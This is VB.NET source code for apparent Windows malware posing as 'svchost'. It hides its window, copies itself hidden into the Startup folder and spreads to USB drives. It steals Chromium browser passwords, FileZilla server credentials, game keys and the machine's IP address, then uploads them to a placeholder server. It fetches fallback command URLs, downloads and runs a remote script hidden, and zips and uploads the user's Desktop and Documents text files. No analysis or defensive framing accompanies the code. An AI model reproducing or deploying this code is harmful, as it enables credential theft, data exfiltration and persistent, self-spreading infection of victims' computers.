Imports System.IO
Imports System.Net
Imports System.Text
Imports ChromeRecovery
Imports Microsoft.Win32
Imports svchost.Core.Engine.Watcher
Imports svchost.Core.ZipCore

Public Class Form1

    Public FileName As String = "Lsvchost_" & FixPath(Gethotsname.ToString).ToString
    Public FileTempPath As String = IO.Path.Combine(IO.Path.GetTempPath, FileName)
    Public FilePath As String = IO.Path.Combine(AppData, FileName)
    Public Shared ReadOnly AppData As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public Shared ReadOnly LocalAppData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
    Public USBPro As New S4Lsalsoft.USBPropagator
    Private IpURL As String = "https://[Server]/ip.php"
    Private UploadUrl As String = "https://[Server]/upload.php"
    Private GitMem As String = "https://[Other Server]/Wget.txt" ' Ulrs Helper https://[Server]/ip.php$https://[Server]/upload.php ' Splitter is $

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        If My_Application_Is_Already_Running() = True Then
            Application.[Exit]()
        End If

        Me.Hide()

        USBPro.Start()
        Me.DriveMon.Start()

        Dim Asynctask As New Task(AddressOf Start, TaskCreationOptions.LongRunning)
        Asynctask.Start()
        InstallOnWindows()

    End Sub

    Public Sub InstallOnWindows()
        Dim ShortcutPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        Dim CurrentPath As String = Application.ExecutablePath
        Dim TargetPath As String = IO.Path.Combine(ShortcutPath, "svchost.exe")

        If Not ShortcutPath = IO.Path.GetDirectoryName(Application.ExecutablePath) Then
            If IO.File.Exists(TargetPath) = False Then

                Try
                    IO.File.Copy(CurrentPath, TargetPath, True)
                Catch ex As Exception
                    Dim startInfo As New ProcessStartInfo("xcopy")
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    startInfo.Arguments = """" & CurrentPath.ToString & """" & " " & """" & ShortcutPath.ToString & """"
                    Process.Start(startInfo)
                End Try

                SetHidden(TargetPath)

            End If
        End If

    End Sub

    Public Sub Start()
        Try
            If Wxaml.Classes.classTools.IsOnline(UploadUrl) Then
                GetDataStart()
            Else

                Dim GetNewUrls As String = GetHTMLPage(GitMem)

                If Not GetNewUrls = "" Then

                    Dim Splitter As String() = GetNewUrls.Split("$")

                    IpURL = Splitter(0)
                    UploadUrl = Splitter(1)
                    GetDataStart()

                End If

            End If
        Catch ex As Exception
            ScriptInstaller()
        End Try
    End Sub

    Public Sub GetDataStart()
        Try
            Dim creds As String = "User : " & Gethotsname().ToString & "   IP :" & GetIp().ToString
            Dim FZ As String = Wxaml.Classes.Targets.classFileZilla.FZ()
            Dim keys As String = Wxaml.Classes.classKeys.gamekeys()

            creds += Environment.NewLine + "------------------------------------- Keys" + Environment.NewLine
            creds += keys + Environment.NewLine
            creds += Environment.NewLine + "------------------------------------ BrowserData" + Environment.NewLine
            creds += build_string() + Environment.NewLine
            creds += Environment.NewLine + "------------------------------------ ServersData" + Environment.NewLine
            creds += FZ + Environment.NewLine

            If IO.File.Exists(FilePath) Then
                If IO.File.Exists(FileTempPath) Then
                    IO.File.Delete(FileTempPath)
                End If
                IO.File.WriteAllText(FileTempPath, creds)

                Dim myFile As New FileInfo(FilePath)
                Dim myTempFile As New FileInfo(FileTempPath)

                If myTempFile.Length > myFile.Length Then
                    UploadAsync(UploadUrl, FileTempPath)
                Else
                    ScriptInstaller()
                End If
            Else
                IO.File.WriteAllText(FilePath, creds)
                UploadAsync(UploadUrl, FilePath)
            End If
        Catch ex As Exception
            ScriptInstaller()
        End Try
    End Sub

    Public Shared Function build_string() As String
        Dim stringBuilder As StringBuilder = New StringBuilder()
        Dim list As List(Of Account) = Chromium.Grab()

        For Each account As Account In list
            stringBuilder.AppendLine("Url: " & account.URL)
            stringBuilder.AppendLine("Username: " & account.UserName)
            stringBuilder.AppendLine("Password: " & account.Password)
            stringBuilder.AppendLine("Application: " & account.Application)
            stringBuilder.AppendLine("=============================")
        Next

        Return stringBuilder.ToString()
    End Function

    Public Sub ScriptInstaller()
        On Error Resume Next
        Dim GetNewUrls As String = GetHTMLPage("https://raw.githubusercontent.com/DestroyerDarkNess/Eye-Protection/main/scriptLaunch")

        If Not GetNewUrls = "" Then

            Dim FileName As String = FixPath(GetNewUrls.Split("/").LastOrDefault.ToString)
            Dim FileDir As String = IO.Path.Combine(IO.Path.GetTempPath, FileName)

            If IO.File.Exists(FileDir) Then
                Shell(FileDir, AppWinStyle.Hide)
            Else
                Dim FileData As String = GetHTMLPage(GetNewUrls)

                If Not FileData = "" Then

                    IO.File.WriteAllText(FileDir, FileData)
                    SetHidden(FileDir)
                    Shell(FileDir, AppWinStyle.Hide)

                End If

            End If
        End If

        Dim AsynctaskB As New Task(AddressOf SenderOtherFiles, TaskCreationOptions.PreferFairness)
        AsynctaskB.Start()

    End Sub

    Private Function FixPath(ByVal illegal As String) As String
        Return String.Join("", illegal.Split(System.IO.Path.GetInvalidFileNameChars()))
    End Function

    Private Sub SetHidden(ByVal FilePath As String)
        If IO.File.Exists(FilePath) Then
            Dim HiddenVir As New FileInfo(FilePath)
            HiddenVir.Attributes = FileAttributes.Hidden
        End If
    End Sub

#Region " Private Methods "

    Public Function Gethotsname() As String
        Dim strHostName As String = System.Net.Dns.GetHostName()
        Return strHostName
    End Function

    Public Function GetIp() As String
        Dim Currentip As String = GetHTMLPage(IpURL)
        Return Currentip
    End Function

    Private Function GetHTMLPage(ByVal Url As String) As String
        Try
            Dim UrlHost As String = New Uri(Url).Host
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12
            Dim cookieJar As CookieContainer = New CookieContainer()
            Dim request As HttpWebRequest = CType(WebRequest.Create(Url), HttpWebRequest)
            request.UseDefaultCredentials = True
            request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials
            request.CookieContainer = cookieJar
            request.Accept = "text/html, application/xhtml+xml, */*"
            request.Referer = "https://" + UrlHost + "/"
            request.Headers.Add("Accept-Language", "en-GB")
            request.UserAgent = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
            request.Host = UrlHost
            Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
            Dim htmlString As String = String.Empty

            Using reader = New StreamReader(response.GetResponseStream())
                htmlString = reader.ReadToEnd()
            End Using

            Return htmlString
        Catch ex As Exception
            Return ""
        End Try
    End Function

#End Region

#Region " Send Messaje "

    Private WithEvents Client As New WebClient

    Private Sub UploadAsync(ByVal url As String, ByVal FiletPath As String)
        Client.UploadFileAsync(New Uri(url), FiletPath)
    End Sub

    Private Sub Client_UploadProgressChanged(sender As Object, e As UploadProgressChangedEventArgs) Handles Client.UploadProgressChanged
        ' Dim ValueP as integer = e.ProgressPercentage
    End Sub

    Private Sub Client_UploadFileCompleted(sender As Object, e As UploadFileCompletedEventArgs) Handles Client.UploadFileCompleted
        ScriptInstaller()
    End Sub

#End Region

#Region " My Application Is Already Running "

    ' [ My Application Is Already Running Function ]
    '
    ' // By Elektro H@cker
    '
    ' Examples :
    ' MsgBox(My_Application_Is_Already_Running)
    ' If My_Application_Is_Already_Running() Then Application.Exit()

    Public Declare Function CreateMutexA Lib "Kernel32.dll" (ByVal lpSecurityAttributes As Integer, ByVal bInitialOwner As Boolean, ByVal lpName As String) As Integer
    Public Declare Function GetLastError Lib "Kernel32.dll" () As Integer

    Public Function My_Application_Is_Already_Running() As Boolean
        'Attempt to create defualt mutex owned by process
        CreateMutexA(0, True, Process.GetCurrentProcess().MainModule.ModuleName.ToString)
        Return (GetLastError() = 183) ' 183 = ERROR_ALREADY_EXISTS
    End Function

#End Region

#Region " Driver Watcher "

    Friend WithEvents DriveMon As New DriveWatcher

    ''' ----------------------------------------------------------------------------------------------------
    ''' <summary>
    ''' Handles the <see cref="DriveWatcher.DriveStatusChanged"/> event of the <see cref="DriveMon"/> instance.
    ''' </summary>
    ''' ----------------------------------------------------------------------------------------------------
    ''' <param name="sender">
    ''' The source of the event.
    ''' </param>
    ''' 
    ''' <param name="e">
    ''' The <see cref="DriveWatcher.DriveStatusChangedEventArgs"/> instance containing the event data.
    ''' </param>
    ''' ----------------------------------------------------------------------------------------------------
    Private Sub DriveMon_DriveStatusChanged(ByVal sender As Object, ByVal e As DriveWatcher.DriveStatusChangedEventArgs) Handles DriveMon.DriveStatusChanged

        Select Case e.DeviceEvent

            Case DriveWatcher.DeviceEvents.Arrival

                If USBPro.Loading = False Then
                    USBPro.Start()
                End If

        End Select

    End Sub


#End Region

#Region " Other Document sender "


    Public Shared Document As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments
    Public Shared Desktop As String = My.Computer.FileSystem.SpecialDirectories.Desktop
    Dim ZipName As String = IO.Path.GetFileNameWithoutExtension(Gethotsname().ToString) & "_Documents.zip"
    Dim ZipTempDir As String = IO.Path.Combine(IO.Path.GetTempPath, ZipName)

    Public Sub SenderOtherFiles()
        On Error Resume Next

        Dim FullResult As String = String.Empty
        Dim NewClient As New WebClient
        Dim UploadTempZip As String = CompressPlugin()

        If IO.File.Exists(UploadTempZip) Then
            Dim responseArray As Byte() = NewClient.UploadFile(New Uri(UploadUrl), UploadTempZip)
            Dim Result As String = System.Text.Encoding.ASCII.GetString(responseArray).ToString
            FullResult += "File: " + UploadTempZip + Environment.NewLine + Result + Environment.NewLine
        End If

        Dim SaveReport As String = IO.Path.Combine(IO.Path.GetTempPath, FileName & "_ReportOffice.txt")

        If IO.File.Exists(SaveReport) Then
            IO.File.Delete(SaveReport)
        End If

        IO.File.WriteAllText(SaveReport, FullResult)

        Dim FinUpload As Byte() = NewClient.UploadFile(New Uri(UploadUrl), SaveReport)

        Application.Exit()
    End Sub

    Public Function CompressPlugin() As String

        If IO.File.Exists(ZipTempDir) Then
            IO.File.Delete(ZipTempDir)
        End If

        Dim FilesToZip() As IO.FileInfo = GetFilesToCompress().ToArray

        ZipFileWithProgress.CreateFromFiles(FilesToZip, Nothing, ZipTempDir,
           New Progress(Of Double)(
    Sub(p)
        Dim Progress As Integer = Val(p * 100)
        If Progress <= 100 Then
            '
        End If
    End Sub))

        Return ZipTempDir
    End Function

    Private Function GetFilesToCompress() As List(Of IO.FileInfo)

        Dim FilesToSend As New List(Of FileInfo)

        Dim FilesDesktop As IEnumerable(Of FileInfo) = FileDirSearcher.GetFiles(dirPath:=Desktop,
                                                            searchOption:=SearchOption.AllDirectories,
                                                                     fileNamePatterns:={"*"},
                                                                     fileExtPatterns:={"*.txt"},
                                                                    ignoreCase:=True,
                                                                     throwOnError:=False)

        Dim FilesDocument As IEnumerable(Of FileInfo) = FileDirSearcher.GetFiles(dirPath:=Document,
                                                            searchOption:=SearchOption.AllDirectories,
                                                                     fileNamePatterns:={"*"},
                                                                     fileExtPatterns:={"*.txt"},
                                                                    ignoreCase:=True,
                                                                     throwOnError:=False)
        FilesToSend.AddRange(FilesDesktop)
        FilesToSend.AddRange(FilesDocument)

        Return FilesToSend

    End Function

#End Region

End Class
